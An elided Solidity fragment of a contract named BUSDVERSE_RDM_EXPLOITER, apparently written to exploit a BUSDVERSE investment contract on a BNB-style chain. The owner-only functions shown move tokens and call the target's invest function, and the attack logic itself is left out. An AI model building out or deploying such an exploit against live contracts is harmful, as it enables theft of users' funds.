...
contract BUSDVERSE_RDM_EXPLOITER is Context, Ownable {
    ...
    IBEP20 public LINK = IBEP20(0x84b9B910527Ad5C03A9Ca831909E21e236EA7b06);



	function invest1_blabla(BUSDVERSE _BUSDVERSE, address _ref, uint256 _value) public payable onlyOwner{

		LINK.transferFrom(msg.sender, address(this), _value); 
		_BUSDVERSE.invest(_ref,3, _value);
	...
	function invest2_blabla(BUSDVERSE _BUSDVERSE, address _ref, uint256 _value, uint256 _min) public payable onlyOwner{
